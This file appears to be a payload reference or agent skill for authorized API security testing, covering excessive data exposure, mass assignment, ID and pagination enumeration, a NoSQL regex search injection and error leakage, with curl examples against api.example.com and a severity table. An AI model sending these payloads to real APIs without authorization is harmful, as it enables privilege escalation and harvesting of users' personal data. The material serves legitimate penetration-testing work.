# API Data Exposure Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual malicious operations are prohibited
> - Payloads are for understanding attack surface only, **do not enable harm**
> - Validation proves vulnerability existence, **no destructive operations**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Objectives (Within Security Boundary)

API data exposure vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Excessive Data Exposure | ✓ Observe response for extra fields | - | Harvest sensitive data |
| Mass Data Enumeration | ✓ Test pagination limits | ✓ Enumerate beyond limit | Download full dataset |
| IDOR Data Access | ✓ Access other user's public data | - | Access private data |
| Hidden Field Discovery | ✓ Analyze response structure | - | Exploit hidden fields |

**Safe Validation Method**: Observe what data is exposed; do not harvest or exploit sensitive data.

### Extra Fields in Response
```bash
# Normal request for user information
curl -X GET "https://api.example.com/v1/users/1001" -H "Authorization: Bearer <token>"

# Check if response contains fields that should not be exposed
# Sensitive field examples: password_hash, email, phone, internal_id, reset_token, role
# {
#   "id": 1001,
#   "username": "testuser",
#   "password_hash": "$2b$12$...",  <-- excessive exposure
#   "role": "admin"                 <-- excessive exposure
# }
```

### GraphQL Field Over-Exposure
```graphql
# Try querying all available fields (Introspection)
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# Try requesting sensitive fields
query {
  user(id: 1001) {
    username
    email
    passwordHash
    internalNotes
  }
}
```

## Mass Assignment

### Modify Extra Fields in Request
```bash
# Inject sensitive fields during registration or profile update
# Common target fields: role, isAdmin, isVerified, credits, plan, status
curl -X POST "https://api.example.com/v1/users" \
     -H "Content-Type: application/json" \
     -d '{"username":"attacker", "password":"Password1!", "role":"admin", "isAdmin":true}'

# PUT/PATCH request injection
curl -X PATCH "https://api.example.com/v1/users/me" \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{"email":"attacker@example.com", "account_balance":999999}'
```

## Sensitive Information Enumeration

### ID Enumeration
```bash
# Incremental ID enumeration
for i in {1..100}; do
  curl -s "https://api.example.com/v1/users/$i" | grep -i "email"
done

# UUID enumeration (if UUID generation algorithm is weak or leaked)
```

### Pagination Abuse
```bash
# Try to get all data, bypass pagination limits
curl -X GET "https://api.example.com/v1/users?limit=100000&offset=0"
curl -X GET "https://api.example.com/v1/users?page=1&per_page=-1"
```

### Search Function Enumeration
```bash
# Use search endpoint to enumerate user information (e.g., via email prefix)
curl -X GET "https://api.example.com/v1/search/users?q=admin@"
curl -X GET "https://api.example.com/v1/search/users?email[$regex]=^admin"
```

### Error Message Differential Analysis
```bash
# Determine if user exists via response status code or error message
# Exists: 401 Unauthorized / "Invalid password"
# Does not exist: 404 Not Found / "User does not exist"
curl -X POST "https://api.example.com/v1/login" -d '{"email":"admin@example.com", "password":"wrong"}'
```

## Error Information Leakage

### SQL Error Exposes Table Structure
```bash
# Inject single quote or special characters to trigger database error
curl -X GET "https://api.example.com/v1/users?id=1'"
# Response may contain: "Syntax error in SQL statement... SELECT * FROM users WHERE id=1'"
```

### Stack Trace Leakage
```bash
# Send unexpected data type to trigger exception
curl -X POST "https://api.example.com/v1/upload" \
     -H "Content-Type: application/json" \
     -d '{"file": {"nested": "object"}}'
# Response may contain complete Java/Python/Node.js stack trace
```

### Framework Version Leakage
```bash
# Check response headers or default error pages
curl -I "https://api.example.com/v1/api"
# Watch for: Server, X-Powered-By, X-AspNet-Version etc. headers
```

## Analysis Process

1. Intercept and analyze all API responses, check if they contain extra sensitive fields (frontend filtering vs backend filtering)
2. Identify all endpoints accepting JSON/XML input (POST/PUT/PATCH)
3. Try adding guessed privileged fields in request body (e.g., `role: admin`), observe if backend accepts
4. Test ID enumeration and pagination parameters, evaluate if batch data retrieval is possible
5. Intentionally send malformed data or special characters, observe if error responses leak internal system information

## Output

- Proof payload
- Complete request packet and response packet containing sensitive information (HTTP format)
- List of leaked sensitive fields or stack trace screenshots

## Severity Classification

API excessive data exposure severity is based on "whether exposed data is sensitive" — PII/credentials/sensitive business data is required for High. 

| Actual case | Severity | Note |
|---------|------|------|
| response exposes PII/credentials/sensitive business data (password_hash/reset_token/role/account_balance) | High | sensitive data disclosure |
| exposes non-sensitive list data (usernames/ID list, enumerable but non-sensitive) | Medium | limited information |
| only exposespagination/counts/structure (total count/field names/pagination parameters) | Low | Informational |
| field exists but is filtered or empty | Low | no actual disclosure |
| bulk enumeration discloses >100 user PII / full credential fields | Critical | massive data leak |

**Key judgment**:Reporting High requires confirmingresponse actually contains PII/credentials/sensitive fields. only field names are returned with empty values/or only non-sensitive lists such as usernames are returned, record as Medium/Low. Do not perform large-scale export. 

---

## Prohibited

- ⚠️ No using mass assignment to modify other users' critical data
- ⚠️ No large-scale database dumping or downloading massive sensitive data
- ⚠️ Only prove existence + provide command/PoC